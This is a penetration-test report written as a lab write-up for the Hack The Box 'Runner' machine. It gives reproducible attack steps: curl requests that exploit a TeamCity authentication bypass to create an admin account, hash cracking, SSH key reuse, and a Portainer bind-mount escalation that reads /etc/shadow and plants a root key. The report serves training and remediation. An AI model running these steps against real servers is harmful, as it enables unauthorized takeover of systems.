---
title: Runner Ext. Web Penetration Test
topic: PT Reports
---

Runner - HTB Labs - External Web Penetration Test

Report of Findings

09-02-2024


## Table of Contents
1. [Executive Summary](#executive-summary)
	- [Approach](#approach)
	- [Scope](#scope)
	- [Assessment Overview and Recommendations](#assessment-overview-and-recommendations)
2. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
	- [Summary of Findings](#summary-of-findings)
3. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
	- [Detailed Walkthrough](#detailed-walkthrough)
4. [Remediation Summary](#remediation-summary)
	- [Short Term](#short-term)
	- [Medium Term](#medium-term)
	- [Long Term](#long-term)
5. [Technical Findings Details](#technical-findings-details)
6. [Appendices](#appendices)
	- [Appendix A - Finding Severities](#appendix-a---finding-severities)
	- [Appendix B - Exploited Hosts](#appendix-b---exploited-hosts)
	- [Appendix C - Compromised Users](#appendix-c---compromised-users)
	- [Appendix D - Changes/Cleanup](#appendix-d---changescleanup)
	- [Appendix E - Additional References](#appendix-e---additional-references)


## Executive Summary

A external web-application penetration test was conducted by Omar(hereinafter referred to as the "tester") to assess security flaws in the 'Runner' externally facing web-application with the purpose of determining security impact of successful exploitation, documenting all findings, and providing recommendations to mitigate issues found. 


### Approach
The tester performed the assessment under a “Black Box” approach with no additional information, credentials, or access to the web service. All testing was preformed from the testers work machine with a clean VM install. Testing was preformed ensuring confidentiality, integrity, and availability of the service would not be further compromised or affected, without any additional stipulations such as evasiveness. The goal of the assessment was to identify and exploit any flaws, mis-configurations, or vulnerabilities while clearly demonstrating security impact, meticulously documenting each step in a reproducible manner along the way.  



### Scope
The scope of this audit included ONE external IP address and any services running on the host.

In-Scope Assets:

| IP/Host        | Description         |
| -------------- | ------------------- |
| 10.129.230.247 | `runner` Linux Host |

### Assessment Overview and Recommendations

During the course of the assessment against the Runner environment, the tester identified five(5) findings that pose a considerable risk to the confidentiality, integrity, and availability of `Runner`'s information systems.

Throughout the engagement, the tester noted that Runner's operating systems were patched and up-to-date with services being properly isolated. All issues discovered throughout the assessment involved individual web applications, accessible sensitive information, password re-use, or unnecessary user privileges.

The first finding was related to an un-patched, out-of-date web service with known public vulnerabilities. The vulnerability allows for the retrieval of an Administration session token, this is almost like a temporary password that can be used to authenticate to the service as an administrator, giving all the same rights and privileges that an administrator would gain from logging in normally. This vulnerability is well-known and has multiple public exploits online, this is particularly dangerous as even an unskilled attacker can abuse it to gain unauthorized access to the service. This service should be updated with monitoring set up to ensure its always kept up-to-date.

The next finding involved sensitive information being included in backups for the same un-patched web service. With administrator access, a backup of the service can be done and downloaded using the normal functionality present in the service. While this isn't inherently dangerous on its own, the backup included a 'key' for a system user, this key can be used to authenticate and access the underlying server that hosts the service. Private information such as passwords or keys should never be included in backups. Back-ups are an important factor in maintaining availability, these should continue to be done but with extra care to ensure sensitive information is never placed in any location that is backed-up.

The tester also discovered that some users are using weak, common passwords. These are passwords that can easily be guessed(via 'password cracking') and used to gain unauthorized access to the system or service as those users. Further, the tester discovered instances in which a password was re-used across multiple different services, this is especially dangerous as it means if one service is compromised by an attacker, they would automatically be able to access and compromise other services or systems using the same password. To avoid such cases, a strong password policy should be set and enforced throughout the organizations, requiring users to create long(16+ character) passwords with numeric and special characters. These passwords should be rotated('changed') often and not be re-used across multiple different systems or services.

Finally, the tester discovered that there exists inadequate security controls on a highly sensitive service. Any user with access to the service had excessive privileges that allowed them to have full, administrator control over the service. This particular service can be abused by attackers to gain full administrator privileges to the underlying server, giving access to all documents, operations, and applications running on the machine. With this serious level of access, an attacker can compromise confidentiality, integrity, and availability of the machine and all applications running within. This can be resolved by ensuring that every service, especially highly privileges ones, are configured to place users in certain roles with varying levels of access. A principle of least privilege (PoLP) methodology should be adopted to ensure users only have enough access to preform their day-to-day duties.

A [Remediation Summary](#remediation-summary) that includes short, medium, and long term recommendations is incorporated in this report. This should be used to devise a remediation plan that will correct the findings in this report and strengthen Runner's overall security posture.

---

## Network Penetration Test Assessment Summary

The tester began the assessment from the standpoint of a unauthenticated user on the internet. No credentials, configurations, or knowledge of the underlying systems was given to the tester. The tester solely received an IP address for a host located on the internet.


### Summary of Findings

Throughout the assessment, the tester uncovered five(5) findings that pose a considerable risk to the web service and the underlying `runner` Linux host. Each finding on its own was quantified individually, ranging from medium to critical, however a complete chain detailing how the findings were used together is included in the [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough) section of this report.



Below is a list of all findings discovered throughout the course of the assessment. More details, including descriptions, impact, affected services, remediation, references, and evidence is included in the [Technical Findings Details](#technical-findings-details).

| Finding # | Severity | Finding Name                                                     |
| --------- | -------- | ---------------------------------------------------------------- |
| 1         | Critical | Inadequate Security Controls on Privileged Docker Operations     |
| 2         | Critical | Unpatched Web Service Allowing Unauthorized Administrator Access |
| 3         | High     | Sensitive Information Exposed in Backups                         |
| 4         | High     | Password Re-use across different services                        |
| 5         | Medium   | Weak, Common User Credentials                                    |

---

## Internal Network Compromise Walkthrough

Throughout the penetration test, the tester was able to gain a foothold from the external TeamCity service and move laterally through the machine, gaining full `root` access to the `runner` Linux host. Included in this section are detailed steps that demonstrate the attack chain used, starting from the point of view of an unauthenticated user to compromising the entire machine. This walkthrough is meant to show how the flaws discovered can be fit together to achieve full system compromise, more information detailing each individual flaw can be found in the [Technical Findings Details](#technical-findings-details) section of this report.

### Detailed Walkthrough
The tester carried out the following chain of actions to compromise the `runner` Linux host.

1. The tester ran a port scan with service detection using the [nmap](https://github.com/nmap/nmap) tool and detected the presence of the `http://runner.htb` web application.
2. The tester then 'fuzzed' the website to find additional subdomains and vHosts using the [ffuf](https://github.com/ffuf/ffuf) tool, this resulted in the discovery of the `teamcity.runner.htb` domain. `http://teamcity.runner.htb` was visited via a web-browser, this revealed the version(`Version 2023.05.3`) number on the login screen.
3. Next, the tester found a [public exploit](https://www.exploit-db.com/exploits/51884) for `TeamCity 2023.05.3`, this allowed for the retrieval of the administrator session token via an un-protected TeamCity API. This was then used to create a new Administrator account.
4. With administrator access to the TeamCity web-portal, the tester used intended TeamCity Administration functionality to create and download a full backup of the service via the `http://teamcity.runner.htb/admin/admin.html?item=backup` endpoint.+
5. The tester enumerated the downloaded backup archive, this led to the discovery of `/database_dump/users`, a file containing: TeamCity usernames, names, email addresses, and bcrypt password hashes for the users `John` and `Matthew`. Further enumeration of the same backup archive revealed `/config/projects/AllProjects/pluginData/ssh_keys/id_rsa`, a SSH private key.
6. The password hash for the `matthew` user was successfully 'guessed'(via password cracking) using the [Hashcat](https://github.com/hashcat/hashcat) tool, this revealed the plain-text password for the `matthew` user.
7. With knowledge of two users on the system, the tester was able to discover the private SSH key belonged to `john`. This was used to gain shell-level access to the `runner` host via SSH as the `john` user.
8. Next, the tester enumerated the `runner` host, discovering a Vhost(Virtual Host) for the `portainer-administration.runner.htb` web service. This vHost was added to the `/etc/hosts` file on the testers machine.
9. The tester navigated to the `http://portainer-administration.runner.htb` via web-browser and discovered the Portainer.io web service. Credentials for the previously 'cracked' `matthew` users were used to authenticate with the service, granting access to the portainer.io dashboard.
10. The portainer.io service allows for management of docker containers, images, volumes, and networks. This access was used to create a custom volume named `testers-volume` with a bind mount from the hosts `/` root directory. Next, the tester created a new container using the `ubuntu:latest` image with the custom `testers-volume` mounted to `/mnt/` within the docker container effectively mounting the hosts root directory, `/` to the containers `/mnt/` directory.
11. The tester then started the container and used the web-console to attach to it, this gave the tester full access to any files on the `runner` host system via the `/mnt/` directory. The tester leveraged this access to read the SSH private key of the `root` user on the `runner` host located at `/mnt/root/.ssh/id_rsa`
12. Finally, the tester proceeded to use the SSH private key to connect to the `runner` host as the `root` user, this resulted in full compromise of the `runner` machine. 


Below is the exact reproduction steps taken, including evidence, for the attack chain detailed above: 

The tester first ran an nmap scan to enumerate the network on the provided entry machine. The tester used the `-A` flag for service detection(`-sV`), OS detection(`-O`), default scripts(`-sC`) and traceroute(`--traceroute`).

```console?prompt=$
└─$ sudo nmap -A 10.129.230.247                                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 18:22 MST
Nmap scan report for 10.129.230.247
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE     VERSIONfsafasf
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

<SNIP>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.16 seconds
```

The tester noted the services running on the machine include SSH, a NGINX ran HTTP web-service, and a Nagios NSCA Passive Check Daemon server. 

Port 80 redirects to `http://runner.htb/`, the tester added this to the `/etc/hosts` file.
```console?prompt=$
└─$ cat /etc/hosts
# Host addresses
<SNIP>
10.129.230.247 runner.htb
```

The tester navigated to `http://runner.htb` and noted a web service advertising for "Runner", a company specializing in CI/CD solutions.

![Runner Web Application](/assets/images/Runner_Web_App.png)

Enumerating web app technologies used with Wappanalyzer
![Runner Web Application Tech](/assets/images/Runner_Web_App_Tech.png)


The tester then proceeded to 'fuzz' directories and subdomain using the [ffuf](https://github.com/ffuf/ffuf) tool, this is a method of guessing(or 'brute-forcing') directories and subdomains from a wordlist until a valid status code is returned. 
```console?prompt=$
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://runner.htb/ -H 'Host: FUZZ.runner.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 584ms]

```

The `teamcity` subdomain/vHost was found. The tester adds this to their `/etc/hosts` file and connects to the service via a web-browser to be greeted by a `TeamCity` login page.
![TeamCity Logon Page](/assets/images/TeamCity_Login.png)

The service allowed for quick fingerprinting, giving the version and build number on the login page to un-authenticated users. The tester searched for known public exploits for `TeamCity 2023.05.3` and discovered a [exploit](https://www.exploit-db.com/exploits/51884) allowing for creation of an Administrator account without authentication. 

The tester re-constructed the requests from the exploit script and sent them via curl. The first request is to retrieve the token of the admin user(User ID: 1).
```console?prompt=$
└─$ curl -X POST "http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-08-31T06:39:31.303Z" value="eyJ0eXAiOiAiVENWMiJ9.SkpjdU5QNlpVc0FoOUJxNDc4QlpSOTBlSHdR.ZmE3YjU3NTYtZTc3MC00YWI0LTk0MzctMjI3ZDA1YjE4Mzkx"/>
```

After retrieving the token, the tester sends another request to the `/app/rest/users` API endpoint to create a new user account with the `SYSTEM_ADMIN` role.
```console?prompt=$
└─$ curl --path-as-is -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.SkpjdU5QNlpVc0FoOUJxNDc4QlpSOTBlSHdR.ZmE3YjU3NTYtZTc3MC00YWI0LTk0MzctMjI3ZDA1YjE4Mzkx" -X POST http://teamcity.runner.htb/app/rest/users -H "Content-Type: application/json" --data '{"username": "city_admin_temp_tester000", "password": "th3...<REDACTED>...!22", "email": "tester@tester.testing.local", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'


<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="city_admin_temp_tester000" id="12" email="tester@tester.testing.local" href="/app/rest/users/id:12"><properties count="3" href="/app/rest/users/id:12/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="city_admin_temp_tester000"/><property name="teamcity.server.buildNumber" value="129390"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:12/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>
```

The newly created account was used to log into the TeamCity web application as an Administrator
![TeamCity Admin Login](/assets/images/TeamCity_Auth.png)

The tester enumerated the intended functionalities of the service, before the `http://teamcity.runner.htb/admin/admin.html?item=backup` endpoint was found. This allows for backups of the TeamCity database, server settings, build logs, personal changes, and more to be backup via the web portal and downloaded.

The backup ZIP archive was downloaded to the testers machine
![TeamCity Backup Download](/assets/images/TeamCity_Backup_Download.png)

Within `/config/projects/AllProjects/pluginData/ssh_keys/` in the archive, a `id_rsa` SSH private key is discovered. This is extracted to the testers machine.
![TeamCity Backup SSH-Key](/assets/images/TeamCity-Backup-SSH.png)

Further enumerating the backup archive, a `users` file was found in `/database_dump`. This file contained the username, email, and password hash for all registered users. Two names stick out, `John`, the admin, and `Matthew`, another user. 

```console?prompt=$
└─$ cat users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV...<REDACTED>...qufye, John, john@runner.htb, 1725086505483, BCRYPT
2, matthew, $2a$07$q.m...<REDACTED>...Vo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
<SNIP>
```

The tester opted to attempt to "crack" the passwords with the [Hashcat](https://github.com/hashcat/hashcat) tool before attempting to use them with the SSH private key found. Using the hashcat [example-hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page, the hash type was identified as likely `bcrypt $2*$, Blowfish (Unix)`. The tester succeeded in cracking the hash for the `matthew` user, revealing the clear-text password. 
```console?prompt=$&error=<SNIP>
└─$ hashcat -m 3200 htb.runner.users.hashes Downloads/rockyou.txt 
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: Downloads/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

<SNIP>

$2a$07$q.m...<REDACTED>...Vo.Em:<REDACTED>
```

Password re-use was unsuccessfully tested for both user to access the system through SSH. Next, the tester used the `id_rsa` private key found earlier and was able to SSH into the `runner` host as the `john` user.
```console?prompt=$
└─$ ssh john@10.129.230.247 -i id_rsa   
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

<SNIP>

john@runner:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

The tester copied over the [linpeas](https://github.com/peass-ng/PEASS-ng) tool, a utility used to search for privilege escalation vectors on a Linux host.
```console?prompt=$
└─$ scp -i id_rsa tools/linpeas.sh john@10.129.230.247:~/.cache/          
linpeas.sh                                                                                  100%  804KB 973.5KB/s   00:00
```

The tester ran `linpeas.sh` while continuing to manually enumerate the system.
```console?prompt=$
john@runner:~/.cache$ bash linpeas.sh 

<SNIP>

╔══════════╣ Hostname, hosts and DNS
runner
127.0.0.1 localhost
127.0.1.1 runner runner.htb teamcity.runner.htb portainer-administration.runner.htb

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad
search .

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -


══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Apr  4 10:24 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 36 Feb 28  2024 /etc/nginx/sites-enabled/portainer -> /etc/nginx/sites-available/portainer
server {
    listen 80;
    server_name portainer-administration.runner.htb;
    location / {
        proxy_pass https://localhost:9443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
<SNIP>
```

The tester carefully inspected the linpeas.sh output and noted the presence of other services running on localhost, including the `portainer-administration.runner.htb` vHost. This was added to the testers `/etc/hosts` file and navigated to via a web-browser. 
![Portainer.io Login Page](/assets/images/portainerio-login.png)

This revealed the portainer.io service. The tester used the previously cracked credentials for the `matthew` account to successfully log in.
![Portainer.io Auth'd](/assets/images/Portainer_Authd.png)


Searching for public exploits or vulnerabilities, the tester found the [following article](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot) detailing how to exploit portainer.io and escalate privileges via bind mounts. The [portainer.io documentation](https://docs.portainer.io/user/docker/volumes/add) was then used to learn how to create a volume with the necessary flags.
![Creating Portainer Docker Volume](/assets/images/Portainer_Create_Volume.png)



The tester proceeded to create a new Docker container through the portainer.io web-portal. The Image used was `ubuntu:latest` with the image id retrieved from the Images tab in the portainer.io UI.
![Creating Portainer Docker Container](/assets/images/Create_Container.png)

The tester set the volume to the one previously created, this volume created a bind mount from `/` on the host to `/mnt` in the container.
![Attatching Volume to Container](/assets/images/Set_Container_Volume.png)



The tester deployed the container and selected the `>_ Console` option to connect to the container through the web application, starting the `/bin/bash` shell. 
![Started Docker Container](/assets/images/Started_Container.png)


The tester then confirmed access to the host file system via the previously created bind mount and grabbed the `root` users SSH private key located at `/mnt/root/.ssh`.
![Confirming Host Access](/assets/images/Host_Access.png)


Password hashes are grabbed from `/etc/shadow`, these are encrypted with `yescrypt` however which is very computationally expensive with little-to-no GPU acceleration support.
```console?prompt=#
root@d25dc34e08e3:/# cat /mnt/etc/shadow
root:$y$j9T$ANK...<REDACTED>...a30:19788:0:99999:7:::
<SNIP>
matthew:$y$j9T$VcV...<REDACTED>...Vlx/:19781:0:99999:7:::
john:$y$j9T$rpK...<REDACTED>...6F2:19781:0:99999:7:::
_laurel:!:19817::::::
```


The tester also noted that the public key for root was not in the `authorized_keys` file. This was copied from the `id_rsa.pub` file and appended to `authorized_keys` 
```console?prompt=#
root@d25dc34e08e3:/mnt/root/.ssh# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnFEp0WNKI0IlkLRvHZA8YRJk6QzI9eVa069Y13HooUZTdB3otdQ4p0Ybc94bCBPCMY4u2ugEsjWTjSc0sNxWT3KEBjEZ9c9+iVVLoL3368K0QpHjpue66BW2o4OgrvpOlM6QACN1efPT+30NM2XdQkTydB+ST+Jwzd26+j+qSqFiDCUIxsLqXdmJS8ut1Sxi9GQ5RZ9o/I4tUZ1kveLNWDpTcy7lk2mmCbk6oAd0Q3XmoOxVizsaSk1jm1++bkO9TWJfZm30wVMObjoAw/K3IYI+nCbZ87chEBZo64ulajFC+3P3VGQ4GMldiQg4x1lc2af3uIffQIhg3bWHyzATwG8hqPLjBqHEfw1y37MufiqKRulyeyTOqDxGI0Y9cSkL+H72W9rylEgiJIpW4nc/WXoxHR76wml9cd5bnjW1cB8q7coOBu7G0KtJXYgIb59jfZE+GWi2nigxaDgo5i/bqDhIcV/jtNCFIlvDzw8shl5LHqjUF/Mmtu3bx71Q/+ik= root@runner

root@d25dc34e08e3:/mnt/root/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnFEp0WNKI0IlkLRvHZA8YRJk6QzI9eVa069Y13HooUZTdB3otdQ4p0Ybc94bCBPCMY4u2ugEsjWTjSc0sNxWT3KEBjEZ9c9+iVVLoL3368K0QpHjpue66BW2o4OgrvpOlM6QACN1efPT+30NM2XdQkTydB+ST+Jwzd26+j+qSqFiDCUIxsLqXdmJS8ut1Sxi9GQ5RZ9o/I4tUZ1kveLNWDpTcy7lk2mmCbk6oAd0Q3XmoOxVizsaSk1jm1++bkO9TWJfZm30wVMObjoAw/K3IYI+nCbZ87chEBZo64ulajFC+3P3VGQ4GMldiQg4x1lc2af3uIffQIhg3bWHyzATwG8hqPLjBqHEfw1y37MufiqKRulyeyTOqDxGI0Y9cSkL+H72W9rylEgiJIpW4nc/WXoxHR76wml9cd5bnjW1cB8q7coOBu7G0KtJXYgIb59jfZE+GWi2nigxaDgo5i/bqDhIcV/jtNCFIlvDzw8shl5LHqjUF/Mmtu3bx71Q/+ik= root@runner' >> authorized_keys
```

 The tester then proceeded to connect to the `runner` host as the `root` user, effectively fully compromising the entire host.
 ```console?prompt=$,#
└─$ ssh root@10.129.230.247 -i root.id.rsa
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

<SNIP>

Last login: Sat Aug 31 08:33:34 2024 from 10.10.14.44
root@runner:~# id
uid=0(root) gid=0(root) groups=0(root)
```


---
## Remediation Summary

With the tests and data gathered from this assessment, there exists multiple opportunities for Runner to better its security posture. The remediation recommendations are split into three sections(short, medium, and long term), all contributing to the goal of strengthening network security. 
- Short term recommendations are those that will take minimal planning and effort to correct.
- Medium term recommendations are those that will take some time and planning to correct.
- Long term recommendations are more general, and will require discussion and longer-term planning.

#### Short Term
- [Finding #1](#1-inadequate-security-controls-on-privileged-docker-operations) - Move the Portainer.io service into the internal network, avoiding external exposure. 
- [Finding #2](#2-unpatched-web-service-allowing-unauthorized-administrator-access) - Update the TeamCity application beyond `2023.05.3`, preferably to the latest version to avoid other CRITICAL vulnerabilities.
- [Finding #3](#3-sensitive-information-exposed-in-backups) - Ensure no sensitive information or secrets are stored within backup files. These should be explicitly excluded or disallowed from being in backed-up directories.
- [Finding #4](#4-password-re-use-across-different-services) - Change the password to a long(16+ characters), strong password with special and numerical characters. Ensure this is not being re-used across various services.
- [Finding #5](#5-weak-common-user-credentials) - Reset the password to a long(16+ characters), strong password with special and numerical characters, ideally this would be completely randomly generated in accordance to a password policy.

#### Medium Term
- [Finding #1](#1-inadequate-security-controls-on-privileged-docker-operations) - Adopt the principle of least privilege (PoLP), organizing all users within roles according to their day-to-day duties while ensuring that the administrator(Environment Administrator role) is using a strong password that is not re-used from other services. In addition, consider putting the service behind a firewall that allows for monitoring and whitelisting of users in accordance to their devices or IP address.
- [Finding #5](#5-weak-common-user-credentials) - Consider switching to using a organization-wide, managed password manager with company-wide password requirements. 

#### Long Term
- Adopt SSO(Single Sign On) across the entire organization, allowing password policies and MFA requirements to be set globally, company-wide and avoiding individual services from storing user credentials.
- Conduct Security Awareness workshops or seminars across the organization, training all users on healthy password management.
- Adopt additional monitoring across the organization and its networks, this includes not just performance and availability monitoring, but also network security monitor to better detect malicious activities and be able to quickly respond to security threats.



---
## Technical Findings Details:


## 1. Inadequate Security Controls on Privileged Docker Operations

| CWE                               | [CWE-250: Execution with Unnecessary Privileges](https://cwe.mitre.org/data/definitions/250.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| --------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CVSS 3.1 Score                    | [9.1](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Description (Incl. Root<br>Cause) | A user has full access to the docker socket through the portainer.io service, allowing the user to modify/create docker volumes, images, and containers through the portainer.io web dashboard. This allows for the portainer.io user to create a bind mount between the host machine and container, giving full root-level access to the host machine file-system. While this is an intended feature of Docker, and thus portainer.io, it is a highly privileged operation that must be hardened and secured.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Security Impact                   | An attacker with access to the portainer.io web dashboard can potentially create a new volume with a bind mount to the host system(such as root, `/`) and create a new container mounting the volume to a directory within the container(such as `/mnt/`), this can allow the full access of the host file-system from within the container. This can be used to read, modify, and delete any file or service configuration on the host system. <br><br>Further, this can allow for privilege escalation in the form of modifying the `root` user password via `/etc/shadow` to a attacker-known value or by discovering a sensitive file that contains credentials or authentication keys, such as a SSH private key.                                                                                                                                                                                                                                                                                                                                                      |
| Affected Domain                   | (TCP/80) portainer-administration.runner.htb                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Remediation                       | As these operations fall within normal docker allowed operations, it is recommended to further harden the portainer.io service, this can be done in several ways including:<br><br>1. Limit access via a principle of least privilege (PoLP) methodology, allowing users access to only what is absolutely necessary for day-to-day business operations. This includes leveraging the [multiple roles](https://docs.portainer.io/advanced/docker-roles-and-permissions) within portainer.io. <br>To prevent this instance of abuse, a hardened, secure administrator account with the role 'Environment Administrator' can be used to manage the Portainer.IO instance and its resources, while normal users can be given the role of 'Operator' or 'Helpdesk', prohibiting the creation of additional dangerous resources.<br><br>2. Ensure the Portainer.IO service is not exposed externally, this should ideally be placed within its own VLAN or internet network behind a firewall. This additionally gives the ability to whitelist specific users via IP or device. |
| External References               | https://attack.mitre.org/techniques/T1552/004/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |

Searching for public exploits or vulnerabilities, the tester found the [following article](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot) detailing how to exploit portainer.io and escalate privileges via bind mounts. The [portainer.io documentation](https://docs.portainer.io/user/docker/volumes/add) was then used to learn how to create a volume with the necessary flags.
![Creating Portainer Docker Volume](/assets/images/Portainer_Create_Volume.png)



The tester proceeded to create a new Docker container through the portainer.io web-portal. The Image used was `ubuntu:latest` with the image id retrieved from the Images tab in the portainer.io UI.
![Creating Portainer Docker Container](/assets/images/Create_Container.png)

The tester set the volume to the one previously created, this volume created a bind mount from `/` on the host to `/mnt` in the container.
![Attatching Volume to Container](/assets/images/Set_Container_Volume.png)



The tester deployed the container and selected the `>_ Console` option to connect to the container through the web application, starting the `/bin/bash` shell. 
![Started Docker Container](/assets/images/Started_Container.png)


The tester then confirmed access to the host file system via the previously created bind mount and grabbed the `root` users SSH private key located at `/mnt/root/.ssh`.
![Confirming Host Access](/assets/images/Host_Access.png)


Password hashes are grabbed from `/etc/shadow`, these are encrypted with `yescrypt` however which is very computationally expensive with little-to-no GPU acceleration support.
```console?prompt=#
root@d25dc34e08e3:/# cat /mnt/etc/shadow
root:$y$j9T$ANK...<REDACTED>...a30:19788:0:99999:7:::
<SNIP>
matthew:$y$j9T$VcV...<REDACTED>...Vlx/:19781:0:99999:7:::
john:$y$j9T$rpK...<REDACTED>...6F2:19781:0:99999:7:::
_laurel:!:19817::::::
```


The tester also noted that the public key for root was not in the `authorized_keys` file. This was copied from the `id_rsa.pub` file and appended to `authorized_keys` 
```console?prompt=#
root@d25dc34e08e3:/mnt/root/.ssh# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnFEp0WNKI0IlkLRvHZA8YRJk6QzI9eVa069Y13HooUZTdB3otdQ4p0Ybc94bCBPCMY4u2ugEsjWTjSc0sNxWT3KEBjEZ9c9+iVVLoL3368K0QpHjpue66BW2o4OgrvpOlM6QACN1efPT+30NM2XdQkTydB+ST+Jwzd26+j+qSqFiDCUIxsLqXdmJS8ut1Sxi9GQ5RZ9o/I4tUZ1kveLNWDpTcy7lk2mmCbk6oAd0Q3XmoOxVizsaSk1jm1++bkO9TWJfZm30wVMObjoAw/K3IYI+nCbZ87chEBZo64ulajFC+3P3VGQ4GMldiQg4x1lc2af3uIffQIhg3bWHyzATwG8hqPLjBqHEfw1y37MufiqKRulyeyTOqDxGI0Y9cSkL+H72W9rylEgiJIpW4nc/WXoxHR76wml9cd5bnjW1cB8q7coOBu7G0KtJXYgIb59jfZE+GWi2nigxaDgo5i/bqDhIcV/jtNCFIlvDzw8shl5LHqjUF/Mmtu3bx71Q/+ik= root@runner

